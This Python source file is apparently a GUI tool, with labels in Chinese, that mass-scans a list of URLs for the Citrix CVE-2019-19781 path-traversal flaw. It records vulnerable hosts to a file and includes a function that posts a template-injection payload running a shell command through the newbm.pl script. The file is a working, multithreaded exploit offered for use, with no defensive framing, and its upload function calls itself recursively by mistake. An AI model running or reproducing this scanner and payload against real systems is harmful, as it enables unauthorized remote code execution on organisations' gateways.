import requests
import uuid
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
cdl = str(uuid.uuid4()).split('-')[0]
def Citrix_rce_cve_2019_19781_exp(url):
    poc = "/vpn/../vpns/portal/%s.xml" % cdl
    url = url + poc
    headers = {
    "NSC_USER": "nsroot",
    "NSC_NONCE": "nsroot"
    }
    try:
        res = requests.get(url, headers=headers, verify=False, timeout=3)
        if res.status_code == 200:
            Citrix_rce_cve_2019_19781_text.insert(END, "【！！！！！！】存在漏洞的url：" + url + "\n")
            Citrix_rce_cve_2019_19781_text.see(END)
            with open("存在Citrix远程代码执行漏洞(CVE_2019_19781)的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            Citrix_rce_cve_2019_19781_text.insert(END, "【×】不存在漏洞的url：" + url + "\n")
            Citrix_rce_cve_2019_19781_text.see(END)
    except Exception as err:
        Citrix_rce_cve_2019_19781_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        Citrix_rce_cve_2019_19781_text.see(END)
def Citrix_rce_cve_2019_19781_upload_xml(url):
    poc = r"""/vpn/../vpns/portal/scripts/newbm.pl"""
    url = url + poc
    headers = {
    "Connection": "close",
    "NSC_USER": "../../../netscaler/portal/templates/%s"%cdl,
    "NSC_NONCE": "nsroot"
    }
    payload = "url=http://example.com&title=" + cdl + "&desc=[% template.new('BLOCK' = 'print `whoami`') %]"
    try:
        res = requests.post(url=url, headers=headers,data=payload, verify=False, allow_redirects=False)
        if res.status_code == 200 and 'parent.window.ns_reload' in res.content:
            Citrix_rce_cve_2019_19781_upload_xml(url)
    except Exception as err:
        Citrix_rce_cve_2019_19781_text.insert(END, "【×】出现错误，报错内容：" + str(err) + "\n")
        Citrix_rce_cve_2019_19781_text.see(END)
def get_citrix_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def Citrix_rce_cve_2019_19781_gui():
    Citrix_rce_cve_2019_19781 = tk.Tk()
    Citrix_rce_cve_2019_19781.geometry("910x450")
    Citrix_rce_cve_2019_19781.title("Citrix远程代码执行漏洞(CVE_2019_19781)一把梭")
    Citrix_rce_cve_2019_19781.resizable(0, 0)
    Citrix_rce_cve_2019_19781.iconbitmap('logo.ico')
    global Citrix_rce_cve_2019_19781_text
    Citrix_rce_cve_2019_19781_text = scrolledtext.ScrolledText(Citrix_rce_cve_2019_19781,width=123, height=25)
    Citrix_rce_cve_2019_19781_text.grid(row=0, column=0, padx=10, pady=10)
    Citrix_rce_cve_2019_19781_text.see(END)
    addrs = get_citrix_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(Citrix_rce_cve_2019_19781_exp, addr)
    Citrix_rce_cve_2019_19781.mainloop()